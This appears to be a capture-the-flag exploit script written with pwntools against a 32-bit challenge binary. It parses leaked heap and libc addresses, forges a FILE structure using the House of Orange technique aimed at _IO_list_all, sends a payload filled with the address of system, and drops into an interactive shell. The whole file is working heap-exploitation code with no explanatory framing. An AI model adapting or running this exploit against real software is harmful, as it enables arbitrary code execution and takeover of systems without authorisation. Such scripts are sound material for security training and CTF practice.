from pwn import *
import sys

if len(sys.argv)>1:
    r=remote(HOST,PORT)
else:
    r=process('./chall',env={"LD_PRELOAD":"./libc.so.6"})

libc=ELF("./libc.so.6")

if __name__=='__main__':

    r.recvuntil("Heap leak - ")
    heap=int(r.recvuntil("\n").strip())
    r.recvuntil("libc leak - ")
    libc.address=int(r.recvuntil("\n").strip())-0x1b2940+0x190

    log.info("heap @ "+hex(heap))
    log.info("libc @ "+hex(libc.address))

    #gdb.attach(r,'''b*0x080485c6''')

    context.arch='i386'
    q=FileStructure(null=heap-4)
    payload=q.orange(libc.symbols['_IO_list_all'],heap+0x90)
    r.sendline(payload+p32(libc.symbols['system'])*32)

    r.interactive()
